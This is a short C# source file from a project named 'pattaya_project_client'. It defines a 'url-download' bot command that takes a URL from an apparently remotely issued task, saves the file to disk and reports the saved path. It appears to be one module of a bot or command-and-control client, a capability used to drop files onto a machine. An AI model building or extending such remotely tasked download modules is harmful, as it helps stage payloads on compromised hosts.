using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace pattaya_project_client.Commands.Implements
{
    public class UrlDownload : BotCommand
    {
        public override string TaskName => "url-download";

        public override BotTaskResult RunTask(BotTask task)
        {
            var arguments = task.Arguments.Split(' ');

            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
            {

                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = "No url provided"
                };
            }

            var url = arguments[0];


            string fileName = Path.GetFileName(url);

            using (var client = new WebClient())
            {
                client.DownloadFile(url, fileName);
            }

            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = "File downloaded and saved to: " + Path.GetFullPath(fileName)
            };

        }
    }
}
